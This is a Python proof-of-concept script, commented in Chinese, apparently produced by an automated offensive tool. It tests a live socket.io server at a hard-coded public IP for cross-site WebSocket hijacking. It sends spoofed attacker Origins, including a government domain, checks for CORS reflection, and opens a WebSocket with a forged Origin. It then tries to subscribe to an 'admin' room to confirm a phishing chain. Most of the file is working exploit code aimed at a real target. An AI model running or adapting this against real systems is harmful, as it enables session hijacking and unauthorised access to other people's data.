#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Stage 7 - socket.io EIO=4 完整握手 PoC（CSWSH 验证）
目标：http://35.234.50.28:3100/socket.io/

核心验证：
1. polling 握手拿 sid + pingInterval/pingTimeout
2. upgrade WebSocket（socket.io v4 EIO=4）
3. 发送 "40" 进入默认 namespace
4. 验证 Origin 反射（任意 Origin 是否被允许 withCredentials）
5. 接收服务器推送事件并解析

目标：完整闭环验证 CSWSH 钓鱼链可行性
"""
import json
import sys
import time
import urllib.parse
import socket
import struct
import base64
import os
import re
from datetime import datetime

TARGET = "http://35.234.50.28:3100"
WS_TARGET = "ws://35.234.50.28:3100/socket.io/"

LOG_PATH = "/opt/CyberStrikeAI/tmp/workspace/projects/cda6ab9b-2296-4103-b1f0-10410de2eca8/stage7_sio_ws.log"


def log(msg):
    line = f"[{datetime.utcnow().isoformat()}Z] {msg}"
    print(line, flush=True)
    with open(LOG_PATH, "a") as f:
        f.write(line + "\n")


def http_get_with_origin(url, origin):
    import http.client
    parsed = urllib.parse.urlparse(url)
    conn = http.client.HTTPConnection(parsed.hostname, parsed.port, timeout=10)
    headers = {"Origin": origin}
    path = parsed.path
    if parsed.query:
        path += "?" + parsed.query
    conn.request("GET", path, headers=headers)
    resp = conn.getresponse()
    body = resp.read().decode("utf-8", errors="replace")
    cors_origin = resp.getheader("Access-Control-Allow-Origin")
    cors_cred = resp.getheader("Access-Control-Allow-Credentials")
    return {
        "status": resp.status,
        "headers": dict(resp.getheaders()),
        "body": body,
        "cors_origin": cors_origin,
        "cors_credentials": cors_cred,
    }


def stage7_step1_polling_handshake():
    """Step 1: poliing 握手拿 sid + EIO=4 + pingInterval/pingTimeout"""
    log("=" * 70)
    log("Step 1: Polling 握手（EIO=4）")
    log("=" * 70)

    # 不用 Origin
    url_no_origin = f"{TARGET}/socket.io/?EIO=4&transport=polling"
    import http.client
    parsed = urllib.parse.urlparse(url_no_origin)
    conn = http.client.HTTPConnection(parsed.hostname, parsed.port, timeout=10)
    conn.request("GET", parsed.path + "?" + parsed.query)
    resp = conn.getresponse()
    body = resp.read().decode("utf-8", errors="replace")
    log(f"无 Origin: status={resp.status}, body[:200]={body[:200]}")
    sid_match = re.search(r'"sid":"([^"]+)"', body)
    if sid_match:
        sid = sid_match.group(1)
        log(f"  ✓ sid = {sid}")
    else:
        log(f"  ✗ 未找到 sid")
        return None, None

    # 取 pingInterval/pingTimeout
    pinginterval_match = re.search(r'"pingInterval":(\d+)', body)
    pingtimeout_match = re.search(r'"pingTimeout":(\d+)', body)
    if pinginterval_match:
        log(f"  ✓ pingInterval = {pinginterval_match.group(1)}")
    if pingtimeout_match:
        log(f"  ✓ pingTimeout = {pingtimeout_match.group(1)}")
    conn.close()

    # 用恶意 Origin 复测
    log("\n  恶意 Origin 测试：")
    evil_origins = [
        "https://attacker.example",
        "https://evil.example.com",
        "http://localhost",
        "http://35.234.50.28",
        "https://epcr.tpf.gov.tw",
        "null",
        "",
    ]
    cors_results = {}
    for origin in evil_origins:
        result = http_get_with_origin(url_no_origin, origin)
        cors_results[origin] = {
            "cors_origin": result["cors_origin"],
            "cors_credentials": result["cors_credentials"],
            "sid_match": re.search(r'"sid":"([^"]+)"', result["body"]) is not None,
        }
        log(
            f"  Origin={origin!r:40s} → ACAO={result['cors_origin']!r:40s} "
            f"ACAC={result['cors_credentials']!r:10s} sid_ok={cors_results[origin]['sid_match']}"
        )

    return sid, cors_results


def parse_packet(packet):
    """解析 socket.io 帧（EIO=4）：
    - "0{...}" EngineIO open
    - "40" EngineIO message + socket.io connect
    - "40{...}" EngineIO message + socket.io connect event
    - "2" EngineIO ping
    - "3" EngineIO pong
    - "42[...]" EngineIO message + socket.io event (socket.io v3/v4 数组)
    - "4X" prefix = EngineIO message type 4 (message)
    """
    if not packet:
        return ("empty", "")
    eio_type = packet[0]
    if eio_type == "0":
        return ("open", packet[1:])
    if eio_type == "1":
        return ("close", packet[1:])
    if eio_type == "2":
        return ("ping", "")
    if eio_type == "3":
        return ("pong", "")
    if eio_type == "4":
        si_type = packet[1] if len(packet) > 1 else ""
        return ("message", f"si_type={si_type} payload={packet[2:]}")
    return ("unknown", packet)


def ws_handshake(host, port, path):
    """手动完成 WebSocket handshake（不依赖 websocket-client）"""
    key = base64.b64encode(os.urandom(16)).decode()
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Origin: https://attacker.example\r\n"
        f"\r\n"
    )
    sock = socket.create_connection((host, port), timeout=10)
    sock.sendall(req.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        chunk = sock.recv(4096)
        if not chunk:
            break
        resp += chunk
    header, _, rest = resp.partition(b"\r\n\r\n")
    header_str = header.decode("utf-8", errors="replace")
    log(f"  WebSocket handshake 响应头:\n{header_str}")
    return sock, rest, "101 Switching" in header_str or "101" in header_str


def ws_send_text(sock, text):
    """发送 WebSocket text 帧"""
    data = text.encode("utf-8")
    header = bytearray()
    header.append(0x81)  # FIN + text
    mask_key = os.urandom(4)
    plen = len(data)
    if plen < 126:
        header.append(0x80 | plen)  # MASK
    elif plen < 65536:
        header.append(0x80 | 126)
        header.extend(struct.pack(">H", plen))
    else:
        header.append(0x80 | 127)
        header.extend(struct.pack(">Q", plen))
    header.extend(mask_key)
    masked = bytearray(b ^ mask_key[i % 4] for i, b in enumerate(data))
    sock.sendall(bytes(header) + bytes(masked))


def ws_recv_text(sock, buf=b""):
    """接收一个 WebSocket text 帧"""
    while True:
        if len(buf) >= 2:
            b1, b2 = buf[0], buf[1]
            plen = b2 & 0x7F
            offset = 2
            if plen == 126:
                if len(buf) < 4:
                    buf += sock.recv(4096)
                    continue
                plen = struct.unpack(">H", buf[2:4])[0]
                offset = 4
            elif plen == 127:
                if len(buf) < 10:
                    buf += sock.recv(4096)
                    continue
                plen = struct.unpack(">Q", buf[2:10])[0]
                offset = 10
            if len(buf) < offset + plen:
                buf += sock.recv(4096)
                continue
            payload = bytes(buf[offset : offset + plen])
            buf = buf[offset + plen :]
            opcode = b1 & 0x0F
            if opcode == 0x1:
                return payload.decode("utf-8", errors="replace"), buf
            elif opcode == 0x8:
                return ("CLOSE", buf)
            elif opcode == 0x9:
                # pong - skip
                continue
            else:
                continue
        buf += sock.recv(4096)


def stage7_step2_ws_upgrade(sid):
    """Step 2: 升级到 WebSocket 并发送 '40'"""
    log("\n" + "=" * 70)
    log(f"Step 2: WebSocket 升级（sid={sid}）")
    log("=" * 70)
    parsed = urllib.parse.urlparse(WS_TARGET)
    host = parsed.hostname
    port = parsed.port
    path = f"/socket.io/?EIO=4&transport=websocket&sid={sid}"

    try:
        sock, leftover, ok = ws_handshake(host, port, path)
        if not ok:
            log(f"  ✗ WebSocket handshake 失败")
            sock.close()
            return False

        log("  ✓ WebSocket handshake 成功")

        # 发送 socket.io connect (40 = message + connect)
        ws_send_text(sock, "40")
        log("  → 发送 '40' (EngineIO message + socket.io CONNECT)")

        # 等 server CONNECT ack (40)
        sock.settimeout(5.0)
        buf = leftover
        try:
            ack, buf = ws_recv_text(sock, buf)
            kind, payload = parse_packet(ack)
            log(f"  ← 收到 frame: kind={kind} payload={payload!r}")
            if kind == "message" and payload.startswith("si_type=0"):
                log(f"  ✓ socket.io CONNECT 成功")
                # 发送 ping (2) 测试
                ws_send_text(sock, "2")
                log("  → 发送 '2' (EngineIO ping)")
                pong, buf = ws_recv_text(sock, buf)
                kind, payload = parse_packet(pong)
                log(f"  ← 收到: kind={kind} payload={payload!r}")
                if kind == "pong":
                    log("  ✓ Pong 收到 - WS 双向通信正常")

                # 尝试业务事件订阅
                ws_send_text(sock, '42["client.subscribe",{"roomName":"admin"}]')
                log("  → 发送 '42[client.subscribe, roomName=admin]'")
                try:
                    msg, buf = ws_recv_text(sock, buf)
                    kind, payload = parse_packet(msg)
                    log(f"  ← 收到: kind={kind} payload={payload!r}")
                except Exception as e:
                    log(f"  ← 超时/异常（可能是订阅事件后服务端不再推送）: {e}")

                sock.close()
                return True
        except Exception as e:
            log(f"  ✗ 接收超时: {e}")
            sock.close()
            return False
    except Exception as e:
        log(f"  ✗ 异常: {e}")
        return False


def main():
    log("Stage 7 - socket.io EIO=4 CSWSH 完整 PoC")
    log(f"目标: {TARGET}")
    log(f"日志: {LOG_PATH}\n")

    sid, cors_results = stage7_step1_polling_handshake()
    if not sid:
        log("Step 1 失败，无法继续")
        sys.exit(1)

    log("\nCORS 反射汇总：")
    log(json.dumps(cors_results, indent=2))

    if stage7_step2_ws_upgrade(sid):
        log("\n✓ Stage 7 完整成功 - CSWSH 钓鱼链完全可行")
    else:
        log("\n✗ WS upgrade 失败")

    log("\n日志已保存")


if __name__ == "__main__":
    main()
